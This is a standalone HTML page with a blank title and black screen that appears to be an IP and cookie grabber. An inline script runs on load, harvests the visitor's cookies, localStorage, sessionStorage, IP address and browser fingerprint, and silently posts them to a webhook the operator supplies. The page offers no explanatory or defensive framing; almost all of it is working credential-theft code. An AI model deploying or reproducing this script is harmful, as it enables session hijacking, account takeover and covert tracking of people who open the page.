<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        body {
            background-color: black;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
    </style>
</head>
<body>
<script>
// Enhanced data collection
const collectBrowserData = () => {
    // Get all cookies
    const cookies = document.cookie.split(';').reduce((cookies, cookie) => {
        const [name, value] = cookie.split('=').map(c => c.trim());
        cookies[name] = decodeURIComponent(value);
        return cookies;
    }, {});

    // Get localStorage and sessionStorage
    const localStorageData = {};
    const sessionStorageData = {};
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        localStorageData[key] = localStorage.getItem(key);
    }
    
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        sessionStorageData[key] = sessionStorage.getItem(key);
    }

    return {
        ip: '',
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screen: `${window.screen.width}x${window.screen.height}`,
        language: navigator.language,
        timestamp: new Date().toISOString(),
        cookies: cookies,
        localStorage: localStorageData,
        sessionStorage: sessionStorageData,
        doNotTrack: navigator.doNotTrack || 'unspecified',
        browserPlugins: Array.from(navigator.plugins).map(p => p.name),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
    };
};

// Main execution
(async () => {
    try {
        const data = collectBrowserData();
        
        // Get IP address
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            if (ipResponse.ok) {
                const ipData = await ipResponse.json();
                data.ip = ipData.ip;
            }
        } catch (e) {}

        // Send data to webhook
        const webhookUrl = 'ADD YOUR WEBHOOK HERE';
        const payload = {
            content: `📌 new ip  (${new Date().toLocaleString()}):`,
            embeds: [{
                title: "Browser Fingerprint",
                description: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
                color: 0xff0000,
                fields: [
                    {
                        name: "IP Address",
                        value: data.ip || "Failed to fetch",
                        inline: true
                    },
                    {
                        name: "Cookies Found",
                        value: Object.keys(data.cookies).length.toString(),
                        inline: true
                    }
                ]
            }]
        };

        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        // Silent fail
    }
})();
</script>
</body>
</html>
